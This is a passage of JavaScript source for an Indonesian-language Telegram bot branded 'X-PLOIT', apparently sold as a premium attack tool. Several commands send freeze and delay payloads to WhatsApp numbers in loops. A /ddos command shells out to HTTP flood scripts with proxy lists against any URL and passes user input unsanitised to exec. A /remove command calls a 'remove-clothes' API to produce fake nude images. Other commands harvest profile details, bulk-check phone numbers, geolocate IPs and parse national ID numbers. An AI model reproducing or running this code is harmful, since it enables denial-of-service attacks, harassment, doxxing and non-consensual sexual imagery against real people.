      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("angkasa", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /noisy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><b> ⬡═―—⊱ ⎧ 𝗫- 𝗣𝗟𝗢𝗜𝗧 ⎭ ⊰―—═⬡ 
⛧ Target: ${q}
⛧ Type: Freez chat
⛧ Status: Process
━━━━━━━━━━━━━━━━━━━━━━`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await vfz(sock, target);
    await ofmEr(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><b> ⬡═―—⊱ ⎧ 𝗫- 𝗣𝗟𝗢𝗜𝗧 ⎭ ⊰―—═⬡ 
⛧ Target: ${q}
⛧ Type: Freez chat
⛧ Status: Success
━━━━━━━━━━━━━━━━━━━━━━`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Tes", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /noisy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><b> ⬡═―—⊱ ⎧ 𝗫- 𝗣𝗟𝗢𝗜𝗧 ⎭ ⊰―—═⬡ 
⛧ Target: ${q}
⛧ Type: Delay Cursed
⛧ Status: Process
(🍁) King Naren</b></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    await btnStatus(sock, target, false);
    while (Date.now() - Date.now() < 200000) {

}

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><b> ⬡═―—⊱ ⎧ 𝗫- 𝗣𝗟𝗢𝗜𝗧 ⎭ ⊰―—═⬡ 
⛧ Target: ${q}
⛧ Type: Delay Cursed
⛧ Status: Success
(🍁) King Naren</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

//------------------ TOOLS DDOS -------------//
bot.command('ddos', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const input = ctx.message.text.substring(6).trim().split(/\s+/); 

  const target = input[0];
  const time = input[1];
  const methods = input[2];

  if (!target || !time || !methods) {
    return ctx.reply(
      "Contoh Penggunaan:\n/ddos https://example.com 60 pidoras",
      { parse_mode: "HTML" }
    );
  }
await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
❀ Target: ${target}
❀ Time: ${time}
❀ Metode: ${methods}`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://check-host.net/check-http?host=${target}` }
      ]]
    }
  });

  if (methods === "strike") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
  } else if (methods === "mix") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "flood") {
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2vip") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
  } else if (methods === "pidoras") {
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else {
    ctx.reply("❌ Metode tidak dikenali atau format salah.");
  }
});

//------------ CASE TOOLS ---------------//
bot.command("cekbiotele", async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    
    if (args.length < 1 && !ctx.message.reply_to_message) {
        return ctx.reply("📝 Format: /cekbio <username|user_id|reply>\nContoh: /cekbio @username\n/cekbio 123456789\n/cekbio [reply user]");
    }

    let targetUser;
    const processMsg = await ctx.reply("⏳ Mengambil informasi bio...");

    try {
        // Determine target user
        if (ctx.message.reply_to_message) {
            targetUser = ctx.message.reply_to_message.from;
        } else if (args[0].startsWith('@')) {
            const username = args[0].slice(1);
            targetUser = await ctx.telegram.getChat(`@${username}`);
        } else {
            const userId = parseInt(args[0]);
            if (isNaN(userId)) {
                await ctx.editMessageText("❌ User ID atau username tidak valid", {
                    chat_id: ctx.chat.id,
                    message_id: processMsg.message_id
                });
                return;
            }
            targetUser = await ctx.telegram.getChat(userId);
        }

        // Get user profile photos for avatar
        const profilePhotos = await ctx.telegram.getUserProfilePhotos(targetUser.id, 0, 1);
        
        // Get full user info
        const userInfo = await formatUserBio(targetUser, profilePhotos);

        // Send result
        if (profilePhotos.total_count > 0) {
            const photoFile = await ctx.telegram.getFile(profilePhotos.photos[0][0].file_id);
            const photoUrl = `https://api.telegram.org/file/bot${ctx.telegram.token}/${photoFile.file_path}`;
            
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: userInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }],
                        [{ text: "🔄 Scan Ulang", callback_data: `rescan_bio_${targetUser.id}` }]
                    ]
                }
            });
        } else {
            await ctx.reply(userInfo, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Bio check error:", error);
        await ctx.editMessageText("❌ Gagal mengambil informasi user. Pastikan username/userID valid dan user tidak di-private.", {
            chat_id: ctx.chat.id,
            message_id: processMsg.message_id
        });
    }
});

const GH_OWNER = "dapp231";
const GH_REPO = "raa320";
const GH_BRANCH = "index.js";

async function downloadRepo(dir = "", basePath = "/home/container") {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
    const { data } = await axios.get(url, {
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));
            console.log("[UPDATE]", local);
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

bot.command("update", async (ctx) => {
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Proses Auto Update");

    try {
        await downloadRepo("");
        await ctx.reply("✅ Update selesai!\n🔁 Bot restart otomatis.");
        setTimeout(() => process.exit(0), 1500);
    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><pre>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
        // Menggunakan Baileys untuk mendapatkan info kontak
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><pre>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }

        // Mendapatkan detail kontak
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</pre></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

        // Hapus pesan proses
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><pre>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

bot.command("cekgaleri", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekgaleri 62×××\nContoh: /cekgaleri 628123456789");
    }

    const number = args[1];
    const cleanNumber = number.replace(/[^0-9]/g, '');
    const target = cleanNumber + "@s.whatsapp.net";

    const processMsg = await ctx.reply("⏳ ☇ Memindai galeri WhatsApp...");

    try {
        // Cek apakah nomor terdaftar
        const contactCheck = await sock.onWhatsApp(target);
        
        if (!contactCheck || contactCheck.length === 0) {
            await ctx.editMessageText(
                `❌ ☇ Nomor ${number} tidak terdaftar di WhatsApp`,
                { chat_id: ctx.chat.id, message_id: processMsg.message_id }
            );
            return;
        }

        // Simulasi pengambilan data galeri
        const galleryData = await simulateGalleryScan(target);
        
        // Format hasil
        const galleryInfo = formatGalleryInfo(galleryData, cleanNumber);
        
        await ctx.replyWithPhoto(
            galleryData.profilePicture || thumbnailUrl,
            {
                caption: galleryInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📸 Lihat Status", callback_data: `view_status_${cleanNumber}` }],
                        [{ text: "🔄 Scan Ulang", callback_data: `rescan_gallery_${cleanNumber}` }]
                    ]
                }
            }
        );

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Gallery check error:", error);
        await ctx.editMessageText(
            `❌ ☇ Gagal memindai galeri ${number}`,
            { chat_id: ctx.chat.id, message_id: processMsg.message_id }
        );
    }
});

bot.command("cekkontakfile", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (!ctx.message.document) {
        return ctx.reply("👀 ☇ Silakan upload file teks berisi daftar nomor\nFormat: Satu nomor per baris\nContoh:\n628111111111\n628222222222\n628333333333");
    }

    const processMsg = await ctx.reply("⏳ ☇ Mengunduh dan memproses file...");

    try {
        const file = await ctx.telegram.getFile(ctx.message.document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${tokenBot}/${file.file_path}`;
        
        const response = await axios.get(fileUrl);
        const content = response.data;
        
        // Parse nomor dari file
        const numbers = content.split('\n')
            .map(line => line.trim().replace(/[^0-9]/g, ''))
            .filter(num => num.length >= 8 && num.length <= 15)
            .slice(0, 100); // Maksimal 100 nomor

        if (numbers.length === 0) {
            await ctx.editMessageText(
                "❌ ☇ Tidak ada nomor valid yang ditemukan dalam file",
                { chat_id: ctx.chat.id, message_id: processMsg.message_id }
            );
            return;
        }

        await ctx.editMessageText(
            `📁 <b>File Diproses</b>\n\n📊 <b>Nomor Ditemukan:</b> ${numbers.length}\n⏳ <b>Memeriksa kontak...</b>`,
            { 
                parse_mode: "HTML",
                chat_id: ctx.chat.id, 
                message_id: processMsg.message_id 
            }
        );

        let results = [];
        let validCount = 0;
        let progress = 0;

        for (const number of numbers) {
            progress++;
            
            // Update progress setiap 10 nomor
            if (progress % 10 === 0) {
                await ctx.editMessageText(
                    `📁 <b>File Diproses</b>\n\n📊 <b>Progress:</b> ${progress}/${numbers.length}\n✅ <b>Valid:</b> ${validCount}\n⏳ <b>Memeriksa...</b>`,
                    { 
                        parse_mode: "HTML",
                        chat_id: ctx.chat.id, 
                        message_id: processMsg.message_id 
                    }
                );
            }

            const target = number + "@s.whatsapp.net";
            
            try {
                const contactCheck = await sock.onWhatsApp(target);
                
                if (contactCheck && contactCheck.length > 0 && contactCheck[0].exists) {
                    validCount++;
                    results.push(`✅ +${number}`);
                } else {
                    results.push(`❌ +${number}`);
                }
            } catch (error) {
                results.push(`❌ +${number} (Error)`);
            }

            await sleep(1500); // Delay 1.5 detik
        }

        // Buat file hasil
        const resultContent = results.join('\n');
        const resultBuffer = Buffer.from(resultContent, 'utf8');

        await ctx.replyWithDocument({
            source: resultBuffer,
            filename: `hasil_cekkontak_${Date.now()}.txt`
        }, {
            caption: `📊 <b>Hasil Pengecekan Kontak</b>\n\n📁 <b>Total Diproses:</b> ${numbers.length}\n✅ <b>Terdaftar di WA:</b> ${validCount}\n❌ <b>Tidak Terdaftar:</b> ${numbers.length - validCount}`,
            parse_mode: "HTML"
        });

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error in file contact check:", error);
        await ctx.editMessageText(
            "❌ ☇ Gagal memproses file",
            { chat_id: ctx.chat.id, message_id: processMsg.message_id }
        );
    }
});

bot.command("cekkontak", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekkontak 62×××\nContoh: /cekkontak 628123456789");
    }

    const number = args[1];
    const cleanNumber = number.replace(/[^0-9]/g, '');
    const target = cleanNumber + "@s.whatsapp.net";

    const processMsg = await ctx.reply("⏳ ☇ Memeriksa kontak WhatsApp...");

    try {
        // Cek apakah nomor terdaftar di WhatsApp
        const contactCheck = await sock.onWhatsApp(target);
        
        if (!contactCheck || contactCheck.length === 0) {
            await ctx.editMessageText(
                `❌ ☇ Nomor ${number} tidak terdaftar di WhatsApp`,
                { chat_id: ctx.chat.id, message_id: processMsg.message_id }
            );
            return;
        }

        const contact = contactCheck[0];
        
        // Dapatkan info profil lengkap
        let profilePicture = null;
        let status = null;
        let businessProfile = null;

        try {
            profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        } catch (e) {}

        try {
            status = await sock.fetchStatus(target).catch(() => null);
        } catch (e) {}

        try {
            businessProfile = await sock.getBusinessProfile(target).catch(() => null);
        } catch (e) {}

        // Format hasil
        let contactInfo = `<blockquote><pre>⬡═―—⊱ ⎧ WHATSAPP CONTACT INFO ⎭ ⊰―—═⬡</pre></blockquote>\n\n`;
        
        contactInfo += `📱 <b>Informasi Kontak</b>\n\n`;
        contactInfo += `🔢 <b>Nomor:</b> +${cleanNumber}\n`;
        contactInfo += `✅ <b>Status WhatsApp:</b> Terdaftar\n`;
        
        if (contact.exists) {
            contactInfo += `🟢 <b>Akun Aktif:</b> Ya\n`;
        }

        if (status) {
            contactInfo += `📝 <b>Status/Bio:</b> ${status.status || 'Tidak ada'}\n`;
            if (status.setAt) {
                contactInfo += `⏰ <b>Status Diubah:</b> ${new Date(status.setAt).toLocaleString('id-ID')}\n`;
            }
        }

        if (businessProfile) {
            contactInfo += `🏢 <b>Akun Bisnis:</b> Ya\n`;
            contactInfo += `📊 <b>Kategori:</b> ${businessProfile.categories?.[0]?.name || 'Tidak diketahui'}\n`;
            contactInfo += `📋 <b>Deskripsi:</b> ${businessProfile.description || 'Tidak ada'}\n`;
            
            if (businessProfile.email) {
                contactInfo += `📧 <b>Email:</b> ${businessProfile.email}\n`;
            }
            if (businessProfile.website) {
                contactInfo += `🌐 <b>Website:</b> ${businessProfile.website}\n`;
            }
            if (businessProfile.address) {
                contactInfo += `📍 <b>Alamat:</b> ${businessProfile.address}\n`;
            }
        }

        contactInfo += `\n🖼 <b>Foto Profil:</b> ${profilePicture ? 'Tersedia' : 'Tidak tersedia'}\n`;
        contactInfo += `📞 <b>Chat:</b> <a href="https://wa.me/${cleanNumber}">Klik di sini</a>\n`;

        // Kirim hasil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "💬 Cek Grup", callback_data: `checkgroups_${cleanNumber}` }]
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "📊 Cek Detail", callback_data: `checkdetail_${cleanNumber}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking contact:", error);
        await ctx.editMessageText(
            `❌ ☇ Gagal memeriksa kontak ${number}\nError: ${error.message}`,
            { chat_id: ctx.chat.id, message_id: processMsg.message_id }
        );
    }
});

bot.command("remove", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ')
  let imageUrl = args || null

  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id
    const fileLink = await ctx.telegram.getFileLink(fileId)
    imageUrl = fileLink.href
  }

  if (!imageUrl) {
    return ctx.reply('🪧 ☇ Format: /tonaked (reply gambar)')
  }

  const statusMsg = await ctx.reply('⏳ ☇ Memproses gambar')

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`)
    const data = await res.json()
    const hasil = data.result

    if (!hasil) {
      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid')
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id)
    await ctx.replyWithPhoto(hasil)

  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar')
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });
  
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><b> ⬡═―—⊱ ⎧ 𝗫- 𝗣𝗟𝗢𝗜𝗧 ⎭ ⊰―—═⬡ </b></blockquote>
⛧ IP: ${data.ip || "-"}
⛧ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⛧ Region: ${data.region || "-"}
⛧ City: ${data.city || "-"}
⛧ ZIP: ${data.postal || "-"}
⛧ Timezone: ${data.timezone_gmt || "-"}
⛧ ISP: ${data.isp || "-"}
⛧ Org: ${data.org || "-"}
⛧ ASN: ${data.asn || "-"}
⛧ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.command("tiktok", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktok https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("igdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /igdl https://www.instagram.com/p/Cxample123/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video Instagram");

  try {
    // Alternative API - Instagram Downloader
    const { data } = await axios.get("https://api.igdownloader.com/api/ig", {
      params: { url },
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*"
      },
      timeout: 20000
    });

    if (!data || data.error) {
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid dan publik");
    }

    const mediaUrl = data.result?.url || data.result;
    
    if (!mediaUrl) {
      return ctx.reply("❌ ☇ Tidak ada media yang bisa diunduh");
    }

    // Download media
    const media = await axios.get(mediaUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    // Cek tipe media dari Content-Type
    const contentType = media.headers['content-type'];
    const isVideo = contentType && contentType.startsWith('video');

    if (isVideo) {
      await ctx.replyWithVideo(
        { source: Buffer.from(media.data), filename: `ig_${Date.now()}.mp4` },
        { 
          supports_streaming: true,
          caption: "✅ Video Instagram berhasil didownload"
        }
      );
    } else {
      await ctx.replyWithPhoto(
        { source: Buffer.from(media.data) },
        { caption: "📷 Foto Instagram berhasil didownload" }
      );
    }

  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh media`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("nikparse", checkPremium, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK");
